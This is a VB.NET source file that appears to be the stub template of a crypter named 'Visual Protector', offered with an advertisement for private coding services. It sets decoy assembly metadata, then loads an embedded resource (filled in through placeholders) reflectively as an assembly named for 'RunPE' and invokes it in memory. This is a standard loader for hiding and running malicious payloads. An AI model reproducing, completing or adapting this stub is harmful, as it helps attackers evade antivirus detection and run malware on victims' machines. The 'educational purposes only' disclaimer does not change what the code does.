Imports System, Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports System.Reflection
Imports System.Text
Imports System.Security.Cryptography
Imports System.IO.Compression
Imports System.IO
Imports System.Runtime.InteropServices
Imports System.Runtime.CompilerServices
Imports System.Reflection.Emit
Imports System.Windows.Forms

<Assembly: AssemblyTitle("Poison API")>
<Assembly: AssemblyDescription("Poison API")>
<Assembly: AssemblyCompany("Poison API")>
<Assembly: AssemblyProduct("PoisonScanner API")>
<Assembly: AssemblyCopyright("Copyright ©  2016")>


<Assembly: AssemblyVersion("1.0.0.0")>
<Assembly: AssemblyFileVersion("1.0.0.0")>

'Creator     : VisualSoft
'Name        : Visual Protector
'Version     : 0.2F
'Contact Me  : visualsoftware@protonmail.com

'I Do offer Private Coding Service, Private Tools & 1:1 Mentoring, So any one interested can contact on my above email ID.

'If you Like any new feature added in my next Update/release then do write me on my Mail, Will try my best to add it.

'This program is distributed for educational purposes only.


Namespace Intro
    Public Class ChapterOne

        Shared str As String = "%*%"

        Public Shared Sub Main()
            assembly.load(retrieveRunPE).Gettype("Cls").getmethod("Mth").invoke(Nothing, New Object() {str})
        End Sub

        Public Shared Function retrieveRunPE() As Byte()
            Dim resMan As New Resources.ResourceManager("2016", Assembly.GetEntryAssembly)
            Return resMan.GetObject("%libraryName%")
        End Function


    End Class

End Namespace